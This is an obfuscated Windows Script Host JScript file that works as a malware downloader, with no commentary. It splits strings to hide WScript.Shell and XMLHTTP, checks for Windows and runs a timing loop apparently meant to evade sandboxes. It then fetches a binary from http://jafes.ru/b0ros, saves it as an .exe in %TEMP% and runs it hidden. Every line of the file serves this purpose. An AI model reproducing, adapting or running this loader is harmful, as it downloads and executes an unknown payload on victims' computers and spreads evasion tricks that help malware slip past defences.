var V1 = false;
var LK = "Create"+"Object";
var YR = function AX() {return WScript[LK]("WScript"+".Shell");}(), V0 = 11;
var Z0 = "MSXML2"+".XMLHTTP";
var P0 = 2;
var F0 = P0 - 2;
function P(A0){YR["Run"](A0, F0, F0);};
function DX(){return Z0 + "";};
function X(MT, X0){F0 = F0 * 1; return MT - X0;};
function E(){return LK;};
/*@cc_on
  @if (@_win32 || @_win64)
    V1 = true;
  @end
@*/
if (V1)
{
var F = "";
function C(){return 22;};
var KY = 0; var KW = 0;
function D0()
{
var SM = new this["Date"]();
var F1 = SM["getUTCMilliseconds"]();
WScript["Sleep"](C());
var SM = new this["Date"]();
var UQ = SM["getUTCMilliseconds"]();
WScript["Sleep"](C());
var SM = new this["Date"]();
var UU = SM["getUTCMilliseconds"]();
var KY = "Z";
KY = X(UQ, F1);
var KW = "A";
KW = X(UU, UQ);
F = "open";
return X(KY, KW);
}
var E0 = false;
var HS = false;
for (var SV = F0; SV < C() * 1; SV++){if (D0() != F0){
E0 = true; 
KW = "31" + 11 * KY + KW; 
HS = true; 
break;
}}
function FR() {return ((E0 == true) && (E0 == HS)) ? 1 : F0;};
if (E0 && FR() && HS){
function V() {return YR["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "qSIHTBOnhrX.ex" + "e";};
 LW = DX();
 UG = WScript[LK](LW);
 var D1 = 1;
do { 
	for (;D1;){
	try {
		if (D1 == 1)
		{
			UG[F]("GET", "http://jafes.ru/b0ros", false);
			UG["send"]();
			Z1 = "Sleep";
			D1 = 2;
		}
		WScript[Z1](C() + 120); 
		if (UG["readystate"] < 2 * 2) continue;
		D1 = F0;
		function D(PA) {var YA = (1, 2, 3, 4, 5, PA); return YA;};
		C0 = WScript[E()]("ADODB.Stream");
		LW = C0;
		LW[F]();
		LW["type"] = D(1);
		LW["write"](UG["ResponseBody"]);
		C0["position"] = D(F0);
		LW["Save" + "ToFile"](V(), 2);
		C0["cl"+"ose"]();
		I = V();
		P(I);
	} catch(CU){};};
}while (D1);
}
}

